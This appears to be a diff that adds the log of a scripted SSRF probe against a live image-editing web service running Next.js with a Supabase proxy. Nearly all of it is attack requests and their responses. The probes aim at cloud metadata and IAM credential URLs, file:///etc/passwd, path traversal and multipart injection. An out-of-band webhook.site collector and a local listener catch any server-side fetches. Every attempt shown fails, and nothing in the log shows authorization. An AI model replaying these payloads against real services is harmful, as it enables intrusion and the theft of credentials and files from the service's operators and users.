@@ -1,0 +1,79 @@
+WSL ip: 172.19.117.21
+webhook: https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317
+########## 0. Self-test collector (direct request from WSL) ##########
+selftest HTTP 200
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
+########## 1. Start WSL listener on :8899 ##########
+local listener check HTTP 404
+########## 2. /api/submit-photoshop-job with URL fields (auth required) ##########
+--- photoUrl=https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-photoshop
+HTTP 403 : {"error":"Access denied. No generations left."}
+--- photoUrl=http://172.19.117.21:8899/ssrf-photoshop
+HTTP 403 : {"error":"Access denied. No generations left."}
+--- photoUrl=http://169.254.169.254/latest/meta-data/
+HTTP 403 : {"error":"Access denied. No generations left."}
+--- photoUrl=file:///etc/passwd
+HTTP 403 : {"error":"Access denied. No generations left."}
+--- control: empty body
+HTTP 403 : {"error":"Access denied. No generations left."}
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
+########## 3. /api/status/<jobId> path injection ##########
+--- /api/status/https:%2F%2Fwebhook.site%2F385d7c4b-5f1a-4bee-b1e7-4a3321bcd317%2Fssrf-status
+HTTP 500 : {"error":"Failed to check job status on all servers","details":"All servers returned an error or timed out"}
+--- /api/status/http:%2F%2F172.19.117.21:8899%2Fssrf-status
+HTTP 500 : {"error":"Failed to check job status on all servers","details":"All servers returned an error or timed out"}
+--- /api/status/%2F%2Fwebhook.site%2F385d7c4b-5f1a-4bee-b1e7-4a3321bcd317%2Fssrf-status
+HTTP 500 : {"error":"Failed to check job status on all servers","details":"All servers returned an error or timed out"}
+--- /api/status/..%2F..%2F..%2Fetc%2Fpasswd
+HTTP 400 : <html><head><title>400 Bad Request</title></head><body><center><h1>400 Bad Request</h1></center><hr><center>cloudflare</center></body></html>
+--- /api/status/http://169.254.169.254/latest/meta-data/
+HTTP 308 : /api/status/http:/169.254.169.254/latest/meta-data/
+--- /api/status/webhook.site@385d7c4b-5f1a-4bee-b1e7-4a3321bcd317
+HTTP 500 : {"error":"Failed to check job status on all servers","details":"All servers returned an error or timed out"}
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
+########## 4. /api/supabase proxy path manipulation ##########
+--- /api/supabase/rest/v1/../../webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/x
+HTTP 404 : {"error":"requested path is invalid"}
+--- /api/supabase///webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/supaproxy
+HTTP 308 : /api/supabase/webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/supaproxy
+--- /api/supabase/https:/webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/supaproxy
+HTTP 404 : {"error":"requested path is invalid"}
+--- /api/supabase/%2F%2Fwebhook.site%2F385d7c4b-5f1a-4bee-b1e7-4a3321bcd317%2Fsupaproxy
+HTTP 404 : {"error":"requested path is invalid"}
+########## 5. Next.js image optimizer SSRF ##########
+--- /_next/image?url=https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-nextimage.png
+HTTP 400 bytes=30 : "url" parameter is not allowed
+--- /_next/image?url=http://172.19.117.21:8899/ssrf-nextimage.png
+HTTP 400 bytes=30 : "url" parameter is not allowed
+--- /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+HTTP 400 bytes=30 : "url" parameter is not allowed
+--- /_next/image?url=file:///etc/passwd
+HTTP 400 bytes=26 : "url" parameter is invalid
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
+########## 6. /api/remove-background multipart field injection ##########
+multipart+url fields -> HTTP 500 : {"error":"Failed to remove background","details":"Background removal service responded with status: 500"}
+file value = URL string -> HTTP 500 : {"error":"Failed to remove background","details":"Background removal service responded with status: 422"}
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
+########## 7. WSL listener hits (would indicate server-side fetch if target could reach us) ##########
+172.19.117.21 - - [10/Nov/2026 15:44:30] "GET /local-selftest HTTP/1.1" 404 -
+listener stopped
+########## 8. Final webhook state ##########
+--- webhook.site captured requests ---
+collector HTTP 200
+captured: 1
+   GET https://webhook.site/385d7c4b-5f1a-4bee-b1e7-4a3321bcd317/ssrf-selftest?phase=selftest from <egress-ip>
